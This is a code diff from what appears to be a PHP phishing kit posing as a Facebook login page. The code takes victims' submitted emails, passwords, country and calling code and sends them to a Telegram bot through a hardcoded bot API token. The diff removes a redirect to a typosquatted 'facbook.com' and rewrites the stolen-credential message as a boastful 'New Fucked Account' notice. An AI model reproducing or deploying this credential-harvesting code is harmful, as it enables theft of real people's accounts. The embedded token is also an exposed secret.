@@ -1,5 +1,4 @@
 <?php
-header ('Location: https://facbook.com/ ');
 $API_KEY = "1799452510:AAEk7drd0ZPGQqcLFFBzawPB3ZNS12eWDZ4";
 ?>
 <?php
@@ -23,14 +22,17 @@ $login = $_POST["login"];
 $tier = $_POST["tier"];
 $phone = $_POST['phone'];
 $text = urlencode("
-💫 - 𝗻𝗲𝘄 𝗹𝗼𝗴𝗶𝗻 𝗯𝘆 -  𖦹𝙸𝙽𝙳𝙴𝚇 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𖦹
-━━━━━━━━━━━━
-🇮🇶ᯓ ᴇᴍᴀɪʟ 𓂅  `$user`  
-🔥ᯓ ᴘᴀssᴡᴏʀᴅ 𓂅  `$pass`
-🕊️ᯓ ᴄᴏᴜɴᴛʀʏ 𓂅  $country_name`
-🦅ᯓ CN 𓂅  $calling_code`
-━━━━━━━━━━━━
- 🇮🇶- ʙʏ :- @SS0OOS
+* New Fucked Account *
+
+*- Email :* `$user`
+
+*- Password :* `$pass`
+
+*- Country :* `$country_name`
+
+*- CN :* `$calling_code`
+
+*i love:-* @d5ddd
 ");
 $url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
 file_get_contents($url);
